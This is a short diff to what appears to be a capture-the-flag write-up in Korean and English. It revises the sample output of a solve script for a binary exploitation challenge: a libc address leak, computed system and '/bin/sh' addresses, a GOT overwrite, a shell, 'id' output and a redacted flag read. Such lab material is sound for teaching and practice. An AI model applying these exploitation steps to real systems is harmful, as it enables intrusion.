@@ -187,10 +187,13 @@ python solve_template.py
 ```
 
 ```text
-[*] libc_base = 0x7f…000
-[+] loop2=OK  (GOT[puts]=main 재진입 성공)
-[*] round2: *(0x404090)=&"/bin/sh", GOT[setvbuf]=system
+[*] leak calloc = 0x7f7d25bd8b10  ->  libc_base = 0x7f7d25b3d000
+[+] loop2=OK, system=0x7f7d25b8f290, binsh=0x7f7d25cf15bd
+===PWNED===
+[+] shell!
 [*] Switching to interactive mode
+$ id
+uid=1000(holymoly) gid=1000(holymoly) groups=1000(holymoly)
 $ cat /flag
 DH{<FLAG_REDACTED>}
 ```
